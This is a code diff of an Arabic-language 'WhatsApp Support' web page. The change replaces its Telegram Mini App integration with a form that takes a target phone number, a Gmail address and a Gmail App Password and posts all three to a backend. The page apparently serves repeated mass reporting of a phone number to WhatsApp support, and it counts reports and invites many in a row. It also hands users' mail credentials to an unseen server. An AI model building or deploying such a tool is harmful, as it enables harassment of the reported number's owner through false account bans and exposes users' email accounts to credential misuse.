@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>WhatsApp Support Bot</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -14,8 +13,8 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             padding: 20px;
             direction: rtl;
         }
@@ -26,10 +25,11 @@
         }
         
         .card {
-            background: var(--tg-theme-secondary-bg-color, #f5f5f5);
-            border-radius: 12px;
-            padding: 20px;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
             margin-bottom: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
         }
         
         .form-group {
@@ -40,117 +40,138 @@
             display: block;
             margin-bottom: 8px;
             font-weight: 600;
-            color: var(--tg-theme-hint-color, #666);
+            color: #333;
         }
         
         input {
             width: 100%;
             padding: 12px;
-            border: 1px solid var(--tg-theme-hint-color, #ddd);
-            border-radius: 8px;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
             font-size: 16px;
             direction: ltr;
+            transition: border-color 0.3s;
         }
         
         input:focus {
             outline: none;
-            border-color: var(--tg-theme-button-color, #0088cc);
+            border-color: #667eea;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
         
         .status {
             margin-top: 20px;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 10px;
             display: none;
             animation: fadeIn 0.3s;
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-5px); }
+            from { opacity: 0; transform: translateY(-10px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
         @keyframes fadeOut {
             from { opacity: 1; transform: translateY(0); }
-            to { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 0; transform: translateY(-10px); }
         }
         
         .status.success {
-            background: rgba(76, 175, 80, 0.15);
-            color: #4caf50;
-            border: 1px solid #4caf50;
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
             display: block;
         }
         
         .status.error {
-            background: rgba(244, 67, 54, 0.15);
-            color: #f44336;
-            border: 1px solid #f44336;
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
             display: block;
         }
         
         .status.info {
-            background: rgba(33, 150, 243, 0.15);
-            color: #2196f3;
-            border: 1px solid #2196f3;
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
             display: block;
-        }
-        
-        .user-info {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .user-info p {
-            margin: 5px 0;
         }
         
         .header {
             text-align: center;
             margin-bottom: 30px;
+            color: white;
         }
         
         .header h1 {
-            font-size: 24px;
+            font-size: 28px;
             margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
         }
         
         .badge {
             display: inline-block;
             padding: 4px 12px;
-            background: var(--tg-theme-button-color, #0088cc);
+            background: rgba(255,255,255,0.2);
             color: white;
             border-radius: 20px;
             font-size: 12px;
+            margin-top: 10px;
         }
         
         .note {
-            background: var(--tg-theme-secondary-bg-color, #f9f9f9);
+            background: rgba(255,255,255,0.9);
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 10px;
             margin-top: 20px;
             font-size: 12px;
-            color: var(--tg-theme-hint-color, #666);
+            color: #666;
             text-align: center;
         }
         
         .counter {
             text-align: center;
             margin-top: 15px;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 500;
-            color: var(--tg-theme-button-color, #0088cc);
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            color: white;
+            background: rgba(255,255,255,0.2);
             padding: 8px;
             border-radius: 20px;
             display: inline-block;
             width: auto;
-            margin-left: auto;
-            margin-right: auto;
         }
         
         .counter-container {
@@ -159,20 +180,22 @@
         }
         
         .clear-btn {
-            background: var(--tg-theme-secondary-bg-color, #e0e0e0);
-            color: var(--tg-theme-text-color, #666);
-            border: none;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
             padding: 8px 16px;
             border-radius: 20px;
             font-size: 12px;
             cursor: pointer;
             margin-top: 10px;
             transition: all 0.3s;
+            width: auto;
+            display: inline-block;
         }
         
-        .clear-btn:active {
-            opacity: 0.7;
-            transform: scale(0.98);
+        .clear-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateY(-1px);
         }
         
         @media (max-width: 480px) {
@@ -181,7 +204,11 @@
             }
             
             .card {
-                padding: 15px;
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
             }
         }
     </style>
@@ -190,11 +217,8 @@
     <div class="container">
         <div class="header">
             <h1>📱 دعم واتساب</h1>
+            <p>أرسل مشكلتك إلى دعم واتساب</p>
             <span class="badge">Mini App</span>
-        </div>
-        
-        <div class="user-info" id="userInfo">
-            <p>👤 جاري تحميل بيانات المستخدم...</p>
         </div>
         
         <div class="card">
@@ -202,67 +226,50 @@
                 <label>📞 رقم الهاتف (بدون +)</label>
                 <input type="tel" id="phoneNumber" placeholder="مثال: 966512345678" dir="ltr" autocomplete="off">
             </div>
+            
+            <div class="form-group">
+                <label>📧 البريد الإلكتروني (Gmail)</label>
+                <input type="email" id="email" placeholder="example@gmail.com" dir="ltr">
+            </div>
+            
+            <div class="form-group">
+                <label>🔑 كلمة مرور التطبيق (App Password)</label>
+                <input type="password" id="password" placeholder="أدخل كلمة مرور التطبيق" dir="ltr">
+            </div>
+            
+            <button id="sendBtn" onclick="sendReport()">📤 إرسال البلاغ</button>
         </div>
         
         <div id="status" class="status"></div>
         
         <div class="counter-container">
             <div class="counter" id="counter">📊 لم يتم إرسال أي بلاغ بعد</div>
-            <button class="clear-btn" id="clearBtn" style="display: none;">🔄 إعادة ضبط العداد</button>
+            <button class="clear-btn" id="clearBtn" style="display: none;" onclick="resetCounter()">🔄 إعادة ضبط العداد</button>
         </div>
         
         <div class="note">
-            💡只需要 إدخال رقم الهاتف ثم الضغط على الزر الأزرق في الأسفل<br>
-            📨 يمكنك إرسال عدة بلاغات متتالية - التطبيق يبقى مفتوحاً
+            💡 ملاحظة: استخدم كلمة مرور التطبيق وليس كلمة المرور العادية<br>
+            🔑 لإنشاء كلمة مرور تطبيق: https://myaccount.google.com/apppasswords<br>
+            📨 يمكنك إرسال عدة بلاغات متتالية
         </div>
     </div>
     
     <script>
-        let tg = window.Telegram.WebApp;
-        let user = null;
         let sendCount = 0;
-        let lastPhone = '';
+        let isSending = false;
         
-        // تهيئة التطبيق - لا نغلق أبداً
-        tg.ready();
-        tg.expand();
-        
-        // الحصول على بيانات المستخدم
-        user = tg.initDataUnsafe?.user;
-        
-        if (user) {
-            document.getElementById('userInfo').innerHTML = `
-                <p>👤 ${user.first_name || ''} ${user.last_name || ''}</p>
-                <p>🆔 ${user.id}</p>
-                <p>📝 ${user.username ? '@' + user.username : 'لا يوجد يوزرنيم'}</p>
-                <p>✅ مرحباً بك! يمكنك الإرسال المتكرر</p>
-            `;
-        } else {
-            document.getElementById('userInfo').innerHTML = '<p>⚠️ يرجى فتح Mini App من داخل البوت</p>';
+        // تحميل العداد من localStorage
+        const savedCount = localStorage.getItem('sendCount');
+        if (savedCount) {
+            sendCount = parseInt(savedCount);
+            updateCounter();
         }
         
-        // إعداد Main Button
-        tg.MainButton.setText("📤 إرسال البلاغ");
-        tg.MainButton.show();
-        tg.MainButton.disable();
-        
-        // التحقق من صحة رقم الهاتف
         const phoneInput = document.getElementById('phoneNumber');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const sendBtn = document.getElementById('sendBtn');
         const clearBtn = document.getElementById('clearBtn');
-        
-        phoneInput.addEventListener('input', function() {
-            const phone = this.value.trim();
-            if (phone && phone.match(/^\d{8,15}$/)) {
-                tg.MainButton.enable();
-            } else {
-                tg.MainButton.disable();
-            }
-        });
-        
-        // معالج الضغط على Main Button
-        tg.MainButton.onClick(function() {
-            sendReport();
-        });
         
         // تحديث العداد
         function updateCounter() {
@@ -274,21 +281,23 @@
                 counterDiv.innerHTML = `✅ تم إرسال ${sendCount} بلاغ${sendCount > 1 ? 'ات' : ''} بنجاح`;
                 clearBtn.style.display = 'inline-block';
             }
+            localStorage.setItem('sendCount', sendCount);
         }
         
         // إعادة ضبط العداد
-        clearBtn.onclick = function() {
+        window.resetCounter = function() {
             sendCount = 0;
             updateCounter();
-            tg.showPopup({
-                title: 'تم',
-                message: 'تم إعادة ضبط العداد',
-                buttons: [{type: 'ok'}]
-            });
+            showStatus('🔄 تم إعادة ضبط العداد', 'info');
         };
         
-        function hideStatusAfterDelay() {
+        function showStatus(message, type) {
             const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.style.display = 'block';
+            
+            // إخفاء الرسالة بعد 5 ثواني
             setTimeout(() => {
                 if (statusDiv.style.display === 'block') {
                     statusDiv.style.animation = 'fadeOut 0.3s';
@@ -297,153 +306,120 @@
                         statusDiv.style.animation = '';
                     }, 300);
                 }
-            }, 4000);
+            }, 5000);
         }
         
-        function showStatus(message, type) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-            statusDiv.style.display = 'block';
+        async function sendReport() {
+            if (isSending) return;
             
-            hideStatusAfterDelay();
-        }
-        
-        function sendReport() {
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const phoneNumber = phoneInput.value.trim();
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
             
+            // التحقق من المدخلات
             if (!phoneNumber) {
-                tg.showPopup({
-                    title: 'خطأ',
-                    message: 'الرجاء إدخال رقم الهاتف',
-                    buttons: [{type: 'ok'}]
-                });
+                showStatus('الرجاء إدخال رقم الهاتف', 'error');
+                phoneInput.focus();
                 return;
             }
             
+            if (!email) {
+                showStatus('الرجاء إدخال البريد الإلكتروني', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            if (!password) {
+                showStatus('الرجاء إدخال كلمة مرور التطبيق', 'error');
+                passwordInput.focus();
+                return;
+            }
+            
+            // التحقق من صيغة البريد
+            if (!email.match(/^[a-zA-Z0-9._%+-]+@gmail\.com$/)) {
+                showStatus('الرجاء إدخال بريد Gmail صحيح', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            // التحقق من صيغة الرقم
             if (!phoneNumber.match(/^\d{8,15}$/)) {
-                tg.showPopup({
-                    title: 'خطأ',
-                    message: 'الرقم يجب أن يحتوي على 8-15 رقم فقط',
-                    buttons: [{type: 'ok'}]
-                });
+                showStatus('الرقم يجب أن يحتوي على 8-15 رقم فقط', 'error');
+                phoneInput.focus();
                 return;
             }
             
-            // حفظ آخر رقم تم إرساله
-            lastPhone = phoneNumber;
+            isSending = true;
+            sendBtn.disabled = true;
+            sendBtn.textContent = '📤 جاري الإرسال...';
             
-            // إظهار مؤشر التحميل
-            tg.MainButton.showProgress(true);
-            tg.MainButton.setText("جاري الإرسال...");
-            tg.MainButton.disable();
+            showStatus('🔄 جاري إرسال البلاغ...', 'info');
             
             try {
-                // إعداد البيانات للإرسال
-                const reportData = {
-                    action: 'send_report',
-                    data: {
+                // إرسال البيانات إلى الخادم
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
                         phone: phoneNumber,
-                        user_id: user?.id || 'unknown',
-                        username: user?.username || '',
-                        first_name: user?.first_name || ''
-                    }
-                };
-                
-                console.log('Sending report:', reportData);
-                
-                // إرسال البيانات عبر WebApp
-                tg.sendData(JSON.stringify(reportData));
-                
-                // زيادة العداد
-                sendCount++;
-                updateCounter();
-                
-                // مسح حقل رقم الهاتف
-                document.getElementById('phoneNumber').value = '';
-                
-                // إظهار رسالة نجاح
-                showStatus(`✅ تم إرسال البلاغ رقم ${sendCount} بنجاح!`, 'success');
-                
-                // إظهار رسالة منبثقة (اختيارية)
-                tg.showPopup({
-                    title: 'تم الإرسال',
-                    message: `✅ تم إرسال البلاغ رقم ${sendCount} بنجاح!\nيمكنك إرسال بلاغ آخر`,
-                    buttons: [{type: 'ok'}]
+                        email: email,
+                        password: password
+                    })
                 });
                 
-                // التركيز على حقل الإدخال للإرسال السريع
-                setTimeout(() => {
-                    document.getElementById('phoneNumber').focus();
-                }, 100);
+                const result = await response.json();
+                
+                if (result.success) {
+                    sendCount++;
+                    updateCounter();
+                    
+                    // مسح الحقول
+                    phoneInput.value = '';
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    
+                    showStatus(`✅ ${result.message}`, 'success');
+                    
+                    // التركيز على حقل رقم الهاتف
+                    setTimeout(() => phoneInput.focus(), 100);
+                } else {
+                    showStatus(`❌ ${result.message}`, 'error');
+                }
                 
             } catch (error) {
                 console.error('Error:', error);
-                showStatus('❌ حدث خطأ: ' + error.message, 'error');
-                tg.showPopup({
-                    title: 'خطأ',
-                    message: 'حدث خطأ: ' + error.message,
-                    buttons: [{type: 'ok'}]
-                });
+                showStatus('❌ حدث خطأ في الاتصال بالخادم', 'error');
             } finally {
-                tg.MainButton.hideProgress(true);
-                tg.MainButton.setText("📤 إرسال البلاغ");
-                // نعيد تمكين الزر فقط إذا كان الحقل فارغاً
-                if (document.getElementById('phoneNumber').value.trim() === '') {
-                    tg.MainButton.disable();
-                }
+                isSending = false;
+                sendBtn.disabled = false;
+                sendBtn.textContent = '📤 إرسال البلاغ';
             }
         }
-        
-        // تحسين التطبيق
-        tg.setBackgroundColor('var(--tg-theme-bg-color)');
-        tg.setHeaderColor('var(--tg-theme-header-bg-color)');
-        
-        // تحديث ارتفاع التطبيق عند أي تغيير
-        const updateHeight = () => {
-            setTimeout(() => tg.expand(), 50);
-        };
-        
-        // مراقبة تغييرات الحجم
-        const observer = new ResizeObserver(updateHeight);
-        observer.observe(document.body);
-        
-        // مراقبة تغييرات المحتوى
-        const observerContent = new MutationObserver(updateHeight);
-        observerContent.observe(document.body, { childList: true, subtree: true, attributes: true });
         
         // دعم إرسال بالضغط على Enter
         phoneInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                const phone = this.value.trim();
-                if (phone && phone.match(/^\d{8,15}$/)) {
-                    sendReport();
-                } else if (phone) {
-                    tg.showPopup({
-                        title: 'خطأ',
-                        message: 'رقم الهاتف غير صحيح (8-15 رقم)',
-                        buttons: [{type: 'ok'}]
-                    });
-                }
+            if (e.key === 'Enter') sendReport();
+        });
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendReport();
+        });
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendReport();
+        });
+        
+        // حفظ آخر بريد في localStorage
+        const savedEmail = localStorage.getItem('lastEmail');
+        if (savedEmail) emailInput.value = savedEmail;
+        
+        emailInput.addEventListener('change', function() {
+            if (this.value.match(/^[a-zA-Z0-9._%+-]+@gmail\.com$/)) {
+                localStorage.setItem('lastEmail', this.value);
             }
         });
         
-        // حفظ آخر رقم في localStorage (اختياري)
-        const savedPhone = localStorage.getItem('lastPhone');
-        if (savedPhone && savedPhone.match(/^\d{8,15}$/)) {
-            phoneInput.value = savedPhone;
-            tg.MainButton.enable();
-        }
-        
-        // حفظ آخر رقم عند تغييره
-        phoneInput.addEventListener('change', function() {
-            if (this.value.trim().match(/^\d{8,15}$/)) {
-                localStorage.setItem('lastPhone', this.value.trim());
-            }
-        });
-        
-        console.log('Mini App ready - will stay open for multiple sends');
+        console.log('Mini App ready');
     </script>
 </body>
 </html>
